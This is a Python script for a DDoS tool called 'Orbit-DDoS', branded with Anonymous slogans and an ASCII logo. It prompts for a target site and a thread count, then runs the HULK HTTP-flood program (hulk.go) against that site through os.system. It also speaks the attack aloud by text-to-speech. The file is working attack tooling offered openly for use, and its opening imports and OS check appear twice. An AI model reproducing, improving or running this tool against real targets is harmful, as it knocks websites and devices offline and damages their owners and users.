from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
from platform import platform
puk = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]

if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
from colorama import Fore, Back, Style
#print(Fore.RED + 'some red text')
#print(Back.GREEN + 'and with a green background')
#print(Style.DIM + 'and in dim text')
#print(Style.RESET_ALL)
#print('back to normal now')
import socket 
from platform import platform
puk = platform()[0], platform()[1],  platform()[2], platform()[3], platform()[4], platform()[5], platform()[6]

if puk == ('W', 'i', 'n', 'd', 'o', 'w', 's'):
    delet = 'cls'
    dr = '\\'
else:
    delet = 'clear'
    dr = '/'
  
import time
import os
import pyttsx3
import sys
import platform
hostname = socket.gethostname()    
IPAddr = socket.gethostbyname(hostname)

def say_stuff(stuff_to_say):
    engine = pyttsx3.init()
    engine.say(str(stuff_to_say))
    engine.runAndWait()
print(Fore.GREEN + Back.BLACK)
if str(platform.system()) == 'Linux':
    os.system('figlet AnonymousPAK DDoS Attack')
else:
    os.system('pyfiglet AnonymousPAK  DDoS Attack')
  
os.system(delet)
print(Fore.YELLOW + '[+] We are Anonymous, We are a Legion, We do not Forgive, We do not Forget')
time.sleep(5)
# Logo
os.system(delet)
print("""                                                                                           
       .cdo,.                                                                                       
      'dKKKKkl'                                                                                     
    .:OKKKKKKK0xc.                                                                                  
    .dKKKKKKKKKKKKOd;.                                                                              
  .dKKKKKKKKKKKKKKKKOo,.                                                                            
  .cx0KKKKKKKKKKKKKKK0kl'                                                                           
     .'ck0KKKKKKKKKKKKKKK0xc.                                                                       
        .,okKKKKKKKKKKKKKKKKOd:.                                                                    
           .;dOKKKKKKKKKKKKKKKKOo;.        .                                                        
              .:x0KKKKKKKKKKKKKKKKkc.    .okxxo,                                                    
                 'cx0KKKKKKKKKKKKK0c.   ,kKKKKKO;                                                   
                   .,lkKKKKKKKKKK0l..',;dKKKKKKO:                                                   
                      .;dOKKKKK0kOOdx0KKKKKK0Ox,                                                    
                         .:d0Kk;.,kKKKKKKKKKk;.                                                     
                            .,. .o0KKKKKKKKKd. .coc.                                                
                               ;kKKKKKKKKKKKkc:xKKKOd:.                                             
                               :OKKKKKKKKx;:xKKKKKKKKKOo;.                                          
                .';:ccllllllc;.,xKKKKKK0l. 'xKKKKKKKKKKKKkl,.                                       
              .lk0KKKKKKKKKKKK0O00o::cc,  .kKKKKKKKKKKKKKKK0xc'                                     
              .,lkKKKKKKKKKKKKKKK0d'       ,lkKKKKKKKKKKKKKKKK0d:.                                  
                 .l0KKKKKKKKKKKKKKKO;        .;oOKKKKKKKKKKKKKKKKOo;.                               
                  'OOod0KKKKKKKKKKKKkl'         .:d0KKKKKKKKKKKKKKKKkl,.                            
                  .dO, 'cx0KKKKKKKKKKKo.           'cx0KKKKKKKKKKKKKKK0xc'                          
                   cOc   .,lkKKKKKKKKXO,             .,lkKKKKKKKKKKKKKKKK0x;.                       
                   'ko.     .:x0KKKKKKKl                .;oOKKKKKKKKKKKKKKO:.                       
                   .dOc,:cloodxkOk0KKKKd.                  .:d0KKKKKKKKKKx'                         
                   .xOdllc:;;,'...'cxO0l                      'cx0KKKKK0l.                          
                   .;'              ....                        .,lkKKx,                            
                                                                   .,;.                             
                                                                                                    
                ██████╗ ██████╗ ██████╗ ██╗████████╗                                                
               ██╔═══██╗██╔══██╗██╔══██╗██║╚══██╔══╝                                                
               ██║   ██║██████╔╝██████╔╝██║   ██║                                                   
               ██║   ██║██╔══██╗██╔══██╗██║   ██║                                                   
               ╚██████╔╝██║  ██║██████╔╝██║   ██║                                                   
                ╚═════╝ ╚═╝  ╚═╝╚═════╝ ╚═╝   ╚═╝                                                   
                DDoS tool                                                                           
""")

time.sleep(1)
print('Your OS:'+ Fore.RED + str(platform.system())+Fore.GREEN)
print("Your IP:" + IPAddr)
print(Fore.BLACK + '[+] Orbit-DDoS Tool BETA VERSION 0.7         ')
print("|===========================================================================|")
time.sleep(2)
print("                                                                          ")
print(Fore.GREEN + '[+] DDoS Tool starts with 1024 Baseline Threads as Default, change below is Required           ')
try:
    threads = input('[+] ENTER THE NUMBER OF' + Fore.BLUE + ' THREADS ' + Fore.GREEN + 'FOR DDoS >>>')
    site = input(Fore.BLUE + '[+] Enter the Site that You want to' + Fore.RED + ' DDoS ' + Fore.GREEN + '>>>')
    colab_status = input(Fore.YELLOW + 'Are you DDoS with Google Collab [Y/N]')
    attack_severity = input('[+] Enter'+ Fore.RED +' 1'+Fore.GREEN+' For a Very Small'+Fore.RED+' Target'+Fore.GREEN+' Like a Device and' + Fore.YELLOW + ' 2 ' + Fore.GREEN +' for a ' + Fore.YELLOW + 'Website '+ Fore.GREEN + ' >>>')
    if 'Y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'y' == colab_status:
        print('OK, Now Not using Text-to-Speech to make ur Attack look' + Fore.RED+ ' Cool' + Fore.GREEN)
    if 'n' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As You are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))
    if 'N' == colab_status:
        if str(platform.system()) == 'Linux':
            print('[+] As you are on Linux, No, Text-to-Speech')
        else:
            say_stuff("Attacking your Target Website {0} with {1} Threads".format(site, threads))

    print('[+] Executing Command as Follows')
    print(Fore.GREEN +'HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    if 'Windows' in str(platform.system()):
        os.system('go run hulk.go -site {0}'.format(site))
    else:
        os.system('HULKMAXPROCS={0} go run hulk.go -site {1}'.format(threads,site))
    print(Back.BLACK + Fore.GREEN)
    
except:
    print('[+] Execution Stopped with Error Code 0, Install GoLang or Your Internet is not working properly')
    print('[+] Installing Dependancies')
    os.system('python3 Install_Dependancies.py')
    os.system('python Install_Dependancies.py')
    os.system('py Install_Dependancies.py')
    
    

print(" ")    
print(" ")    
print(" ")
print(Back.GREEN + Fore.GREEN +'[+] Anonymous DDoS tool by' + Fore.RED + 'Anonymous Pakistan Community                              ') 
print(Back.BLACK +Fore.GREEN + '[+] Orbit-DDoS Tool made in Python by <CPScript>                      ')
print(Fore.RED + '[+] Youtube: ' + Fore.GREEN + 'https://www.youtube.com/channel/UCpMPWg0TXBINqpCTeol4Yhg')
print(Fore.YELLOW + '[+] GitHub: ' + Fore.GREEN + 'CPScript')
